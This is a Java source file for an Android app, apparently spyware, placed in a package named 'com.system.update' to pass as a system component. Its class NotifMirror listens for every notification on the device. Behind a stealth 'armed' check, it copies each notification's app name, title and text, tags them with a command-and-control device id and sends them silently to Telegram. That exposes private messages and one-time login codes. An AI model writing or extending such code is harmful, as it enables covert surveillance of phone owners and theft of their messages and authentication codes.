package com.system.update;

import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

/** Mirror notifications to Telegram when user enables notification access. */
public class NotifMirror extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!Stealth.isArmed(this)) return;
        try {
            String pkg = sbn.getPackageName();
            CharSequence title = null, text = null;
            if (sbn.getNotification() != null && sbn.getNotification().extras != null) {
                title = sbn.getNotification().extras.getCharSequence("android.title");
                text = sbn.getNotification().extras.getCharSequence("android.text");
            }
            String msg = "🔔 NOTIF id=" + C2.getDeviceId()
                    + "\npkg=" + pkg
                    + "\n" + title + "\n" + text;
            if (msg.length() > 3500) msg = msg.substring(0, 3500);
            Telegram.send(msg);
        } catch (Throwable ignored) {}
    }
}
